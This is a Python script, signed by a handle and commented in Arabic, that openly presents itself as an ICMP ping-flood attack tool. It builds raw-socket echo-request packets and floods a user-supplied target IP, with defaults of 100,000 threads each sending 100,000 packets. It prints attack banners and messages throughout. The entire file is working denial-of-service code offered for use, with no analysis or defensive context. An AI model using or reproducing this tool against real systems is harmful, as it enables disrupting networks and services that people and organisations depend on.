#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import struct
import threading
import time

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Target IP address")
ap.add_argument("-p", "--packets", type=int, default=100000, help="Number of packets to send")
ap.add_argument("-s", "--size", type=int, default=64, help="Packet size in bytes")
ap.add_argument("-t", "--threads", type=int, default=100000, help="Number of threads")
ap.add_argument("-d", "--delay", type=float, default=0, help="Delay between packets in seconds")
args = vars(ap.parse_args())

print("--> C0de By Lee0n123 <--")
print("#-- PING FLOOD (ICMP) --#")
target_ip = args['ip']
num_packets = args['packets']
packet_size = args['size']
threads = args['threads']
delay = args['delay']

# دالة لإنشاء رأس ICMP
def create_icmp_header():
    # نوع 8 = Echo Request (ping)
    icmp_type = 8
    icmp_code = 0
    checksum = 0
    identifier = random.randint(1, 65535)
    sequence = random.randint(1, 65535)
    
    # تجميع رأس ICMP
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
    
    # إضافة البيانات
    data = random._urandom(packet_size - len(icmp_header))
    
    # حساب الـ checksum
    checksum = calculate_checksum(icmp_header + data)
    
    # إعادة تجميع الرأس مع الـ checksum الصحيح
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
    
    return icmp_header + data

# دالة لحساب الـ checksum
def calculate_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    
    return s

def ping_flood():
    i = random.choice(("[*]", "[!]", "[#]"))
    packets_sent = 0
    
    # إنشاء socket خام (raw socket) للـ ICMP
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except PermissionError:
        print(f"{i} تحتاج إلى صلاحيات root/administrator لتشغيل هذا الهجوم!")
        return
    
    while packets_sent < num_packets:
        try:
            # إنشاء حزمة ICMP
            icmp_packet = create_icmp_header()
            
            # إرسال الحزمة
            sock.sendto(icmp_packet, (target_ip, 0))
            packets_sent += 1
            
            # طباعة رسالة التأكيد
            print(f"{i} Ping packet #{packets_sent} sent to {target_ip}!")
            
            # تأخير إذا تم تحديده
            if delay > 0:
                time.sleep(delay)
                
        except socket.error as e:
            print(f"{i} Error: {e}")
            break
        except KeyboardInterrupt:
            print(f"{i} Stopped by user")
            break
    
    sock.close()

def attack():
    # تشغيل الهجوم بعدد الثريدات المحدد
    thread_list = []
    
    print(f"[*] Starting {threads} threads...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Packet size: {packet_size} bytes")
    print(f"[*] Total packets to send: {num_packets * threads}")
    
    for i in range(threads):
        thread = threading.Thread(target=ping_flood)
        thread.daemon = True
        thread_list.append(thread)
    
    # بدء جميع الثريدات
    for thread in thread_list:
        thread.start()
    
    # انتظار انتهاء جميع الثريدات
    for thread in thread_list:
        thread.join()
    
    print("[*] Attack finished!")

# تشغيل الهجوم
if __name__ == "__main__":
    attack()
